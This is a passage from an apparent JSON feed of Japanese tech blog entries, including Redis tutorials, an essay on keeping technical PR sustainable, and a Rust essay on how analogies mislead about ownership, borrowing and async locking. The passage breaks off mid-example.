上げていけばいいのです。その床の高さが、いつか私を支えます。誰にも奪えない、揺るぎない実力として。そして、もう1つ。自分の弱さを恥じる必要はありません。その弱さがあったからこそ、私は「自分を助けるための仕組み」を発明できました。その仕組みは、いずれ同じ弱さを持つ誰かを救うことになります。私の「最悪の日」の対処法は、誰かにとっての「最高のノウハウ」になります。自分の下限を知ることは、諦めではありません。出発点です。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-09T00:22:56.000Z","dateMiliSeconds":1765239776000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"AIに手順書を書かせよう! 手順書作成で向き合うAIの不確実性","link":"https://zenn.dev/kamos/articles/procedure_book_with_ai","contentSnippet":"はじめにAIに手順書を書かせてみよう! 手順書にはいくつか必要なポイントがあるね!明確な作業目的作業内容の確実性手順の網羅性影響範囲AIはここに書かれていること、結構苦手だよね。特に作業内容の確実性を担保することは苦手なんだよね!だから、AIに手順書を書かせるときは、AIが苦手なポイントを補うように工夫する必要があるよ!今回は、AIに｢災害時検証: CloudSQLリージョン移行｣の手順書を書かせてみて、一緒に工夫してみよう! 手順作成 まずはそのまままずは、AIにそのまま手順書を書かせてみよう! 以下のプロンプトを使用してみたよ!Cloud SQLの...","isoDate":"2025-12-08T15:23:49.000Z","dateMiliSeconds":1765207429000,"authorName":"Makoto Kamono","authorId":"kamono"},{"title":"メモリ安全なC言語実装「Fil-C」について紹介","link":"https://dev.mix64.com/2025/12/08/post-397/","contentSnippet":"今回はメモリ安全なC言語実装を提供できる「Fil-C」について紹介します。既存のC言語プログラムに対しても互換性を持ち、再コンパイルすること...","isoDate":"2025-12-08T13:03:10.000Z","dateMiliSeconds":1765198990000,"authorName":"ayibote","authorId":"ayibote"},{"title":"初心で挑むredis入門 ~Redis hashes編~","link":"https://zenn.dev/akasan/articles/redis_data_hash","contentSnippet":"今回はredisで使えるhashesについてみていきます。昨日公開したStringsについてもぜひご覧ください。https://zenn.dev/akasan/articles/redis_datatypes 早速検証！！redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis hashesのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/hashes/ hashesに...","isoDate":"2025-12-08T12:19:17.000Z","dateMiliSeconds":1765196357000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"【初参加】CODE BLUE 2025レポート：体感したトレンドとAIの脅威","link":"https://qiita.com/yutaf11/items/239101da0bf5265b61df","contentSnippet":"はじめに先月、CODE BLUE 2025に参加してきました。私は普段、SRE兼セキュリティエンジニアとして働いています。過去、SREとして技術系のイベントにはいくつか参加してきましたが、セキュリティ特化のオフラインイベントは今回のCODE BLUEが初めてでした。こ...","isoDate":"2025-12-08T08:35:39.000Z","dateMiliSeconds":1765182939000,"authorName":"Yuta Fujii","authorId":"yutaf11"},{"title":"技術広報はちゃんとなめてやれ（技術広報をなめるなを読んで）　","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/08/152614","contentSnippet":"この記事は、whywaita Advent Calendar 2025 8日目のエントリ記事です。whywaita Advent Calendar 10周年ということで、自分もwhywaitaとの出会いと10年という節目を掛けて何か書きたいと考えたのですが、うまいネタが思いつかず。とはいえ、whywaitaと出会ったきっかけがお祭り的な技術イベントだったので、今回は技術イベントの「お祭り性」について語っていきます。思い返すと、技術コミュニティとの出会いは、いつもお祭りのようでした。見知らぬ人と技術の話で盛り上がり、気づいたらとんでもない深い時間になっていた懇親会。準備段階から当日まで、ワクワクしながら作り上げた勉強会。あの空気感こそが、私をエンジニアとして成長させてくれた原動力でもありました。そんな私が最近読んで、考えさせられた記事があります。はじめにSakutaroさんが書かれた「技術広報をなめるな」を読みました。note.comSakutaroさんの主張をこの記事で使うために要約すると、技術広報とは「技術に関する情報流通を最適化すること」であり、採用やブランディングにじわじわ効いてくる組織の筋肉である、ということです。片手間でやるものではなく、専門性を持って取り組むべき重要な機能だと。その主張には100%同意します。技術広報を軽視する組織への警鐘として、価値のある記事でした。詳しくは読んで下さい。ただ、読み終わったあと、ひとつ気になることがありました。「なめるな」と言われて、真面目に取り組んだ人は、どうなるだろう。技術広報の重要性を理解した。だから本気で取り組んだ。毎週ブログを書き、登壇の機会を作り、勉強会を企画した。でも、半年後、1年後、その人はまだ続けているだろうか。私が見てきた現実では、真面目に取り組んだ人ほど、燃え尽きていく。「技術広報は大事だ」と理解しているからこそ、手を抜けない。手を抜けないから、疲弊する。疲弊するから、続かない。続かないから、また新しい誰かが「大事だから」と引き継いで、同じサイクルを繰り返す。ここで断っておくと、私は専任のDevRelや技術広報をやっていたわけではありません。エンジニアとしてブログを書いたり、登壇したり、勉強会を企画したり、そういう活動に参加してきた側です。だから以下は、「現場で技術広報に関わってきたエンジニア」としての個人的な意見です。Sakutaroさんへの反論や批判ではなく、同じテーマを別の角度から眺めてみた、という試みです。Sakutaroさんが「技術広報の重要性」を語ったのなら、私は「技術広報の持続可能性」を語りたい。Sakutaroさんが「なめるな」と言ったのなら、私は「ちゃんとなめてやれ」と言いたい。「なめる」というのは、軽視することではありません。肩の力を抜いて、それでも真剣に向き合うこと。重く構えすぎず、軽やかに、本気で楽しむこと。そういう姿勢を指しています。この記事で言いたいのは、技術広報を「お祭り」として捉え直すことで、どう持続可能な形に設計できるか、という話です。「技術広報を続けられない」のは、個人の努力不足なのか技術広報が続かない。ブログの更新が止まる。勉強会の開催頻度が落ちる。登壇者が見つからない。こうした現象を見たとき、私たちはつい「担当者の努力が足りない」「モチベーションの問題だ」と考えがちです。でも、本当にそうでしょうか。私が見てきた限り、技術広報に関わる人は真面目な人が多い。「会社のためになる」「エンジニアの成長につながる」と信じているからこそ、時間を割いて取り組んでいる。努力が足りないのではなく、むしろ、努力しすぎて燃え尽きている。つまり、個人の努力ではなく、構造に原因があるのではないか。技術広報を「重要な業務」として位置づけるほど、プレッシャーは増す。「会社の顔としてふさわしい記事を」「PVやシェア数で成果を示さないと」「毎月コンスタントに発信を」。こうした期待は、真面目な人ほど重く受け止める。結果として、技術広報は「楽しいからやる」ものではなく「やらなければならない」ものになる。義務感で動く活動は、長くは続きません。だから私は、技術広報を「お祭り」として捉え直すことを提案したい。技術広報を「お祭り」として捉えたとき、何が変わるのか「お祭り」と「業務」の違いは何か。業務には、目標がある。KPIがある。期限がある。評価がある。達成できなければ、失敗になる。お祭りには、もちろん準備や段取りがある。でも、本質は違う。非日常性があって、ワクワクして、参加は自由で、失敗しても笑って済む。みんなで作り上げる。終わったあとに「楽しかったね」と言い合える。思い出してみてください。あなたが「楽しかった」と感じた技術イベントには、何がありましたか。KPIはなかったはずです。評価もなかった。ただ、技術の好きな人たちが集まって、ワイワイやっていた。それだけで、あの場は価値があった。技術広報を「業務」として捉えると、タスクになり、KPIになり、疲弊の原因になります。でも「お祭り」として捉えると、楽しみになり、創造性の源泉になり、持続可能な活動になる。もちろん、会社という組織なのでKPIは必要です。数字で語らないと理解されないこともある。大人ですから、建前として必要なものは必要です。でも本音の部分では、お祭りなんです。Sakutaroさんは技術広報を「技術に関する情報流通を最適化すること」と定義しました。私はその定義に異論はありません。ただ「情報流通の最適化」という言葉は正確ですが、人を動かす力は弱い。「今月の情報流通を最適化しよう」と言われても、イメージが湧かない。でも「お祭りを企画して盛り上げよう」と言い換えると、途端にイメージが湧きます。人は「最適化」という目標には動きにくいけど、「お祭り」という体験には参加したがるんです。そして面白いことに、良いお祭りを企画しようとすると、自然と「情報流通の最適化」が達成されます。読みたくなるブログは情報が届く。参加したくなる勉強会は知見が共有される。面白いカンファレンスブースはブランドが伝わる。お祭りが楽しいのは、予定調和じゃないからです。神輿が予想外の方向に進んだり、知らない人と急に仲良くなったり、思いもよらない出来事が起きる。その「意外性」がお祭りの醍醐味です。技術広報も同じで、完璧に計画されたブログより、思いつきで書いた記事がバズることもある。意外性こそが人の心を動かします。でも、意外性は余裕がないと生まれません。タスクに追われている人に、遊び心は出てこない。「やらなきゃいけない」という義務感からは、「やってみたら面白かった」という発見は生まれない。だから、技術広報には「精神的な遊び」が必要です。お祭りを「業務」として100%真面目にやると、それはもはやお祭りではなくなります。参加の形は、ひとつじゃないお祭りには色んな参加の仕方があります。神輿を担ぐ人もいれば、屋台で焼きそばを売る人もいる。踊る人もいれば、見ているだけの人もいる。写真を撮る人も、SNSで実況する人もいる。ゴミを拾う人も、場所取りをする人もいる。どの参加の仕方も、お祭りの一部です。技術広報も同じです。記事を書く人だけが貢献者ではない。レビューする人も貢献者です。アイデアを出す人も貢献者です。社内で記事をシェアする人も貢献者です。「この前のあの話、ブログにしたら面白そう」と声をかける人も貢献者です。登壇者の練習に付き合う人も貢献者です。「ブログを書いてもらえない」「登壇してもらえない」と悩んでいるなら、視点を変えてみてください。「書いてもらう」「登壇してもらう」以外の参加の形を、用意できているだろうか。神輿を担げる人は限られています。でも、お祭りを楽しむ方法は無数にある。担ぎ手だけがお祭りの参加者ではないんです。「ブログを書いてください」ではなく「先週のSlackでのやり取り、そのままブログにしませんか。私がタイトルと導入書きますよ」。「登壇してください」ではなく「5分のLTでいいので、この前の話をしてくれませんか」。義務ではなく、招待として。「ブログ書いてください」はお願い（義務感）。「ブログ書きませんか」は招待（選択肢）。この違いは大きいんです。あなた自身は、どうでしょうか。技術広報にどんな形でなら、無理なく関われそうですか。「怒られない範囲」は誰が決めているのかお祭りにも「やっていいこと」と「やってはいけないこと」がある。技術広報も同じです。失敗談を書け、人間臭さを出せ、と言われても、リスクが怖い。その懸念は正しいです。だからこそ、「怒られない範囲」を見極める力が必要になります。ただ、その「怒られない範囲」は、誰が決めているのでしょうか。明文化されたルールがあるのか、暗黙の了解なのか。上司が決めているのか、広報部門が決めているのか、法務が決めているのか。あるいは、なんとなく「空気」で決まっているのか。多くの組織では、「怒られない範囲」は明確に定義されていません。だから、発信する側は常に不安を抱えることになる。「これ、出していいのかな」「怒られないかな」。その不安が、発信のハードルを上げている。社内的にはOKだけど、社外的にNGになるケースがあります。「技術的には正しいけど、今その話題は炎上しやすい」という場合です。社外的にはOKだけど、社内的にNGになるケースもあります。「業界では普通の話題だけど、うちの会社ではタブー」という場合です。「怒られない範囲」を見極める能力とは、社内外の文脈を読む力です。これは経験を積むことでしか身につきません。小さく発信して、反応を見て、学んでいく。でも、もし組織として技術広報を続けたいなら、「怒られない範囲」を個人の判断に委ねるのではなく、組織として明確にする努力が必要ではないでしょうか。「ここまではOK」「これはNG」「迷ったらこの人に相談」。そういった指針があるだけで、発信のハードルはぐっと下がります。あなたの組織では、「怒られない範囲」はどのように決まっていますか。誰が決めていますか。それは明文化されていますか。持続可能にするために最後に、どうすれば技術広報を続けられるのか、という話をします。技術広報に関わる人が陥りがちな罠は、自分一人で全部やろうとすることです。ブログの企画、執筆依頼、レビュー、公開作業、SNSでの拡散。全部一人でやると、短期的には回ります。でも、長期的には崩壊します。お祭りは、主催者一人では成立しません。屋台を出す人、演奏する人、ゴミを拾う人、写真を撮る人、SNSで拡散する人。みんなが違う形で参加して、初めてお祭りは盛り上がります。「一人が100やる」のではなく、「10やる人、5やる人、1でも協力してくれる人を探す」これが持続の秘訣です。例えば、こんな工夫ができます。月に1回「ブログネタ出し会」を30分だけ開く。Slackに「こんな話をブログにしたい」と投げるだけのチャンネルを作る。「書けそうな人」ではなく「話が面白かった人」に声をかける。小さな仕組みを作っておくだけで、協力者は見つかりやすくなります。そして、もう1つ大事なこと。人間には波があるということです。10やれる時期もあれば、5しかやれない時期もある。1すらもやれない時期もある。プロジェクトが佳境に入っている時期。体調を崩している時期。家庭の事情がある時期。メンタルが落ちている時期。これは恥ずかしいことでも、甘えでもありません。人間だもの。「去年できたから、今年もできる」という思い込みこそが、燃え尽きの原因なんです。10やれる時は10やる。5しかやれない時は5でいい。やれない時は、休む。大事なのは、この「波」を組織として受け入れられているかどうかです。「先月は3本記事を出したのに、今月は1本もない。どうしたの」というプレッシャーがかかるなら、それは持続可能な仕組みとは言えません。「今月は厳しいので、来月がんばります」と言える文化があるかどうか。あなたのチームでは、パフォーマンスの波を受け入れられていますか。「今は無理」と言える空気がありますか。おわりに冒頭で書いた通り、私とwhywaitaの出会いは、お祭り的な技術イベントでした。あの場には「情報流通の最適化」なんて言葉はなかった。ただ、技術の好きな人たちが集まって、ワイワイやっていただけです。でも、今ならわかります。私がワイワイと参加していたあのイベントの裏側には、真面目に予算を集めてきた人がいた。色んなステークホルダーの合意をまとめてきた人がいた。会場を押さえ、スケジュールを調整し、トラブルに備えていた「ちゃんとした大人」がいた。私はその恩恵を受けて、楽しんでいただけだったんです。10年経って、そのことがようやくわかるようになりました。いずれ自分も、あの「ちゃんとした大人」の側に回らなければならない。恩返しをしなければならない。その自覚はあります。でも、それでも。いや、だからこそ。次の世代の人たちには、お祭り感を味わってほしい。「裏側の苦労」を見せずに、「楽しかったね」と言ってもらえるイベントを作りたい。真面目に準備しながら、参加者には「お祭り」として届ける。それが、私なりの恩返しの形だと思っています。技術広報に関わるすべての人へ。疲れたら、休んでください。無理したら、倒れます。真面目すぎたら、続きません。でも、楽しさだけでも続きません。楽しさと、仕組みと、仲間が必要です。もしあなたが今「何もやれない時期」にいるなら、それでいいんです。休んでください。お祭りは、また元気になってから参加すればいい。技術広報は、あなたがいないと回らないほど脆弱なものであってはいけない。でも、あなたがいると、もっと楽しくなる。それくらいの距離感がちょうどいい。10年前のあの日、技術イベントで会った人と、今もこうしてAdvent Calendarで繋がっている。これこそが、お祭り駆動の技術広報の成果です。どこかのカンファレンスの懇親会で会ったら、お祭りの話をしましょう。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-08T06:26:14.000Z","dateMiliSeconds":1765175174000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"2025年AWS Community Builderの活動報告","link":"https://blog.masasuzu.net/entry/2025/12/08/100000","contentSnippet":"今年はブログ4本(純粋なAWSの記事はなし)、登壇5本(内社内2本)という結果でした。勉強会参加自体はそこそこしてたんですが、アウトプットという点では少し物足りない結果になったなという感想です。要因としてはGoogle Cloud関連の活動が比較的多くて、AWS関連にリソースを割けなかったというのもあります。第二の理由としては今年後半が特に業務が多忙で身動きが取れない月があったのも事実です。とはいえ忙しいは言い訳に過ぎないので、なんとアウトプットする仕組み作りをしていきたいとことです。来年はもっとアウトプットを増やしていきたいです。そこで以下の数値を目標にやっていきたいと考えています。社外登壇: 月0.5本AWSテーマのブログ: 月1本以上やってくぞ。以下今年のアウトプットを置いておきます。ブログAWS関連なしクラウドニュートラルblog.masasuzu.netdiary.masasuzu.netdiary.masasuzu.netblog.masasuzu.net登壇AWS関連 speakerdeck.com speakerdeck.com speakerdeck.comクラウドニュートラル speakerdeck.com speakerdeck.com","isoDate":"2025-12-08T01:00:00.000Z","dateMiliSeconds":1765155600000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"AI時代のスキーマファースト開発 FastAPI \xd7 GitHub Packages で型安全なSDKを自動配布する","link":"https://zenn.dev/meziron/articles/32ac2241bbec38","contentSnippet":"はじめにこの記事は 3-shake Advent Calendar 2025 の記事です。フロントエンド開発者とバックエンド開発者の間で「APIの仕様が違う」「ドキュメントが古い」といった問題に悩まされたことはありませんか？さらにAI時代になり、Claude CodeやCursorなどのAIコーディングツールを使う機会が増えてきました。しかし、AIにAPI呼び出しを実装させると、存在しないエンドポイントを「想像」で実装してしまったり、パラメータの型を間違えたりすることがあります。本記事では、FastAPIのOpenAPI自動生成機能を活用し、GitHub ActionsでTy...","isoDate":"2025-12-07T15:00:49.000Z","dateMiliSeconds":1765119649000,"authorName":"Daichi Kugimiya","authorId":"kugimiya"},{"title":"どこでも動くC言語プログラム「Cosmopolitan Libc」を触ってみた","link":"https://dev.mix64.com/2025/12/07/cosmopolitan-libc/","contentSnippet":"今回はC言語でありながらbuild-anyware run-anywareを目指すプロジェクト「Cosmopolitan Libc」について...","isoDate":"2025-12-07T09:16:04.000Z","dateMiliSeconds":1765098964000,"authorName":"ayibote","authorId":"ayibote"},{"title":"初心で挑むredis入門 ~Redis Strings編~","link":"https://zenn.dev/akasan/articles/redis_datatypes","contentSnippet":"今回はredisで使えるStringsについてみていきます。 早速検証！！redisの環境構築については先日公開した以下の記事を参考にしてください。https://zenn.dev/akasan/articles/redis_quickstartRedis Stringsのドキュメントは以下になります。https://redis.io/docs/latest/develop/data-types/strings/ 単独の値の格納redisでは文字列やシリアライズされたデータをbytesデータとして格納します。早速keyとvalueを指定して文字列を格納してみましょう。...","isoDate":"2025-12-07T03:46:51.000Z","dateMiliSeconds":1765079211000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"初心で挑むredis入門 ~サーバ起動とPythonからのアクセス~","link":"https://zenn.dev/akasan/articles/redis_quickstart","contentSnippet":"今回は改めてredisに入門してみました。今まで使って経験はありつつ、ちゃんと調べて勉強しようということで使ってみました。まずはサーバの建て方とPythonからのアクセス方法をまとめてみます。 検証内容今回は以下の内容を実施しますredisサーバの起動Docker上でサーバを立てますポートは6379でポートフォワーディングによりローカル環境からアクセスできるようにしますpythonコードからのアクセスシンプルなデータの格納と取得を実施 早速検証！！ redisサーバの起動redisサーバをDocker上で立てます。以下のレポジトリを参考にたてます...","isoDate":"2025-12-06T13:56:14.000Z","dateMiliSeconds":1765029374000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"おい、類推するな","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/06/060208","contentSnippet":"この記事は、Rust Advent Calendar 2025 6日目のエントリ記事です。はじめに「それって、○○みたいなものですよね」私は、この言葉に何度救われてきただろう。新しい概念を理解するとき。誰かに説明するとき。問題を解決するとき。類推は、私の思考の基盤だった。いや、今でも基盤だ。ただ、その基盤が思ったほど頑丈ではなかったことを、私は何度も思い知らされてきた。Rustを学び始めた頃の話だ。Rustは、プログラミング言語の1つだ。安全で高速なプログラムを書けることで知られている。私はRustの公式教科書「The Rust Programming Language」を読んでいた。所有権の章に差し掛かったとき、こんな説明に出会った。Rustには「所有権（ownership）」という独特の概念がある。少し専門的な話になるが、プログラムを書くとき、データはコンピュータの「メモリ」という場所に保存される。メモリは有限だから、使い終わったデータは片付けなければならない。片付けを忘れると、メモリがいっぱいになって動かなくなる。逆に、まだ使っているデータを間違えて片付けてしまうと、プログラムが壊れる。多くのプログラミング言語では、この「いつ片付けるか」の管理をプログラマーに任せるか、自動で行うかのどちらかだ。Rustは第三の道を選んだ。「所有権」というルールで、コンパイル時（プログラムを実行する前）に安全性を保証する。ルールはシンプルだ。メモリ上のデータには、必ず1つの「所有者」となる変数が存在する。そして、その値を別の変数に渡すと、所有権が移動（move）する。移動した後は、元の変数からはアクセスできなくなる。所有者がいなくなったデータは、自動的に片付けられる。これがRustの基本ルールだ。（注：この先、コード例が続きます。プログラミングに詳しくない方は、コードの詳細を読み飛ばしても大丈夫です。「類推で理解したつもりになったが、実際は違った」という体験談として読んでいただければ、本記事の主旨は伝わります。）私は頭の中で、勝手に類推を作り上げた。「なるほど、本の貸し借りみたいなものか。本を誰かに貸したら、自分の手元にはない。返してもらうまで読めない」。教科書にそう書いてあったわけではない。私が勝手にそう解釈した。この類推で、所有権の基本は理解できた気がした。コンパイラが怒る理由もわかった。moveが起きる場面も予測できるようになった。私は満足した。「そういうことか」と納得して、次の章に進んだ。しかし、しばらくして困難に直面した。私がやりたかったのは、こういうことだ。本棚に本がある。本を誰かに貸す。貸した本が何かを覚えておきたい。現実世界では当たり前のことだ。これをコードで書こうとした。// 私が書こうとしたコード（コンパイルエラー）struct BookShelf {    books: Vec<String>,    lent_to: Option<&String>,  // 貸した本への参照を持ちたい}Rustでは、所有権を完全に移動させずに、一時的にデータを「見せる」だけの仕組みがある。これを「参照（reference）」や「借用（borrow）」と呼ぶ。&Stringは「Stringへの参照」を意味する。所有権は移動しない。ただ、一時的に覗き見できるだけだ。「本の貸し借り」の類推で考えれば、これは自然なはずだった。本棚には本がある。本を誰かに貸したら、貸した本への参照を持っておく。でも、Rustはこのコードを許さない。error[E0106]: missing lifetime specifier「ライフタイム」。また新しい概念だ。なぜライフタイムが必要なのか。参照は、データの「場所」を覚えている。でも、その場所にあったデータが消えてしまったらどうなるか。参照だけが残って、参照先には何もない。存在しないデータを指す参照。これは危険だ。だから、Rustは参照の「寿命」を追跡する。参照が有効な間は、参照先のデータも存在していなければならない。この寿命を明示するのが、ライフタイムだ。ライフタイムを指定すればいいのか。私は格闘した。// ライフタイムを追加してみるstruct BookShelf<\'a> {    books: Vec<String>,    lent_to: Option<&\'a String>,}コンパイルは通る。貸し出しもできる。let mut shelf = BookShelf {    books: vec![String::from(\\"Rust Book\\"), String::from(\\"Programming Rust\\")],    lent_to: None,};shelf.lent_to = Some(&shelf.books[0]);println!(\\"貸し出し中: {:?}\\", shelf.lent_to);// => 貸し出し中: Some(\\"Rust Book\\")でも、本棚に新しい本を追加しようとすると、地獄が始まる。shelf.books.push(String::from(\\"New Book\\"));error[E0502]: cannot borrow `shelf.books` as mutable because it is also borrowed as immutable  --\x3e src/main.rs:22:5   |18 |     shelf.lent_to = Some(&shelf.books[0]);   |                           ----------- immutable borrow occurs here...22 |     shelf.books.push(String::from(\\"New Book\\"));   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^ mutable borrow occurs here23 |     println!(\\"新しい本を追加: {:?}\\", shelf.books);   |                                      ----------- immutable borrow later used here「本を貸している間は、本棚に新しい本を追加できない」。現実世界ではありえない制約だ。なぜこんなに難しいのか。私は「本の貸し借り」で考え続けた。貸している間も本棚にどの本があるかは覚えている。本棚に新しい本を追加することと、貸した本を追跡することは、まったく独立した操作のはずだ。なのに、なぜRustはそれを許さないのか。長い時間をかけて、やっと気づいた。私の類推が間違っていた。ここで「借用チェッカー（borrow checker）」の話をしなければならない。Rustには、コンパイル時にメモリ安全性を検証する仕組みがある。これが借用チェッカーだ。借用チェッカーの基本ルールはシンプルだ。「参照が有効な間は、参照先のデータを変更してはならない」。なぜこんなルールがあるのか。Vec（可変長配列）の仕組みを考えてみよう。Vecは、内部的には連続したメモリ領域にデータを格納している。本棚でいえば、横一列に並んだ棚だ。最初に5冊分のスペースを確保したとする。6冊目を追加したいとき、どうなるか。今の棚には入らない。だから、より大きな棚を用意して、5冊をすべて移動させる。そして6冊目を追加する。これがVecの動作だ。ここで問題が起きる。移動前の棚の位置を覚えている参照があったとする。本を移動した後、その参照はどこを指すのか。もう本がない場所だ。空っぽの棚を指している。これが「ダングリングポインタ」と呼ばれる危険な状態だ。存在しないデータへの参照。アクセスしたら、何が起きるかわからない。だから、Rustは「参照がある間は変更禁止」というルールを強制する。現実の本の貸し借りには、この問題は存在しない。本棚のサイズを変えても、貸した本が消えることはない。でも、コンピュータのメモリでは、Vecが成長するときにデータが移動する。「本」という類推が、私の理解を助けると同時に、私の理解を歪めていた。正しい設計は、参照ではなくインデックスや識別子を使うことだった。// アプローチ1: インデックスで管理struct BookShelf {    books: Vec<String>,    lent_index: Option<usize>,}let mut shelf = BookShelf {    books: vec![String::from(\\"Rust Book\\")],    lent_index: None,};shelf.lent_index = Some(0);  // インデックスを記録shelf.books.push(String::from(\\"New Book\\"));  // これは動く！println!(\\"貸し出し中: {:?}\\", shelf.books.get(shelf.lent_index.unwrap()));// => 貸し出し中: Some(\\"Rust Book\\")// アプローチ2: 所有権を完全に移動struct BookShelf {    books: Vec<String>,}struct LentBook {    book: String,        // 所有権ごと移動    borrower: String,}let mut shelf = BookShelf {    books: vec![String::from(\\"Rust Book\\"), String::from(\\"Programming Rust\\")],};let lent = LentBook {    book: shelf.books.remove(0),  // 本棚から取り出す    borrower: String::from(\\"Alice\\"),};shelf.books.push(String::from(\\"New Book\\"));  // 本棚は自由に変更できる「本の貸し借り」という類推は、入り口としては正しかった。でも、その類推を引きずりすぎた。Rustにおける「借用」は、現実世界の「貸し借り」とは違う。借用（&T）は「一時的に見せる」だけで、「貸した相手を追跡する」仕組みではない。そして、借用中はデータの変更ができない。この違いに気づくまでに、私は何週間も費やした。類推は、両刃の剣だ。思い返せば、これは初めての失敗ではなかった。非同期処理を学んだときも、同じ罠にはまった。（注：ここからも技術的な話が続きます。コードの詳細は読み飛ばしても、「料理の類推で考えたら、実際の挙動と違った」という話として理解できます。）まず、非同期処理とは何かを説明しておこう。日常生活で考えてみよう。洗濯機を回している間、あなたは洗濯機の前でじっと待っているだろうか。たぶん、その間に別のことをしているはずだ。掃除をしたり、料理を作ったり。洗濯機が終わったら、干しに行く。これが「非同期」の発想だ。プログラムも同じだ。通常のプログラムは、1つの処理が終わるまで次の処理に進めない。ファイルを読み込んでいる間、プログラムは待っている。ネットワークからデータを取得している間も、待っている。これでは効率が悪い。「待っている間に、別のことをやろう」。これが非同期処理だ。私は類推を作り上げた。「非同期処理は、料理を並行して作るようなものか」。パスタを茹でている間にソースを作る。オーブンで肉を焼いている間にサラダを準備する。待ち時間を有効活用して、全体の調理時間を短縮する。この類推で、Rustのasync/await構文の基本は理解できた。async fn cook_dinner() {    let pasta = boil_pasta();      // パスタを茹で始める    let sauce = make_sauce().await; // ソースを作る（待つ）    let pasta = pasta.await;        // パスタが茹で上がるのを待つ    serve(pasta, sauce);}問題は、「共有リソース」にアクセスするコードを書いたときだった。共有リソースとは何か。料理の例で考えよう。キッチンには、コンロが1つしかない。2人の料理人が、同時にそのコンロを使いたいとする。どうなるか。1人が使っている間、もう1人は待つしかない。プログラムでも同じことが起きる。データベース接続、ファイル、あるいはメモリ上のデータ構造。複数の処理が同時に1つのリソースにアクセスしようとすると、混乱が起きる。だから、「Mutex（ミューテックス）」という仕組みで順番を管理する。1つの処理がMutexを「ロック」したら、他の処理はロックが解除されるまで待たなければならない。use std::sync::Arc;use tokio::sync::Mutex;struct Kitchen {    stove: Arc<Mutex<Stove>>,  // コンロは1つしかない（Mutexで保護）}async fn cook_two_dishes(kitchen: &Kitchen) {    let stove = kitchen.stove.clone();    // 2つの料理を「並行して」作ろうとする    let dish1 = tokio::spawn({        let stove = stove.clone();        async move {            let mut s = stove.lock().await;  // コンロを確保            cook_on_stove(&mut s).await;     // 10分かかる        }    });    let dish2 = tokio::spawn({        let stove = stove.clone();        async move {            let mut s = stove.lock().await;  // コンロを確保しようとする            cook_on_stove(&mut s).await;     // ...が、dish1が終わるまで待つ        }    });    let _ = tokio::join!(dish1, dish2);}私は「並行して料理を作る」と思っていた。2つの料理を同時に調理して、時間を半分にできるはずだと。でも、コンロは1つしかない。片方がコンロを占有している間、もう片方は待っていた。実行してみると、こうなる。[メインコンロ] パスタ の調理を開始[メインコンロ] パスタ の調理が完了[メインコンロ] ソース の調理を開始[メインコンロ] ソース の調理が完了合計調理時間: 4.00秒各料理2秒なら、並行処理で2秒のはずだった。でも、4秒かかった。並行処理の意味がなかった。なぜこうなるのか。現実の料理で考えてみよう。実際のキッチンでは、Aさんがコンロの左側でパスタを茹でている間、Bさんが右側でソースを温められる。コンロには複数の口がある。だから、2人が同時に調理できる。でも、私のコードでは、コンロを「1つのもの」としてMutexで保護していた。「コンロ全体」をロックしていた。だから、1人がコンロを使っている間、もう1人はコンロの前で待つしかなかった。これが「排他制御」の現実だ。Mutexで保護された共有リソースは、一度に1つのタスクしかアクセスできない。「料理を並行して作る」という類推には、この排他制御の概念が含まれていなかった。私の頭の中のキッチンには、コンロの口がいくつもあった。でも、コードの中のキッチンには、コンロが1つしかなかった。より厄介な問題もあった。「デッドロック」だ。デッドロックとは何か。日常の例で説明しよう。AさんとBさんが、食事をしようとしている。テーブルには、ナイフとフォークが1本ずつしかない。食事をするには、両方が必要だ。Aさんは先にナイフを取った。Bさんは先にフォークを取った。Aさんは思う。「フォークがほしい。Bさんが手放すまで待とう」。Bさんも思う。「ナイフがほしい。Aさんが手放すまで待とう」。どちらも、自分が持っているものを手放さない。どちらも、相手が手放すのを待っている。永遠に。これがデッドロックだ。async fn prepare_meal(kitchen: &Kitchen) {    // タスク1: まずコンロを確保、次にオーブンを確保    let task1 = async {        let _stove = kitchen.stove.lock().await;        tokio::time::sleep(Duration::from_millis(10)).await;        let _oven = kitchen.oven.lock().await;  // オーブンを待つ        // ...    };    // タスク2: まずオーブンを確保、次にコンロを確保    let task2 = async {        let _oven = kitchen.oven.lock().await;        tokio::time::sleep(Duration::from_millis(10)).await;        let _stove = kitchen.stove.lock().await;  // コンロを待つ        // ...    };    tokio::join!(task1, task2);  // 永遠に終わらない}タスク1がコンロを持ってオーブンを待ち、タスク2がオーブンを持ってコンロを待つ。お互いが相手を待ち続けて、永遠に進まない。実行してみると、こうなる。[タスク1] コンロを確保しました！[タスク2] オーブンを確保しました！[タスク1] オーブンを確保しようとしています...[タスク2] コンロを確保しようとしています...⚠️  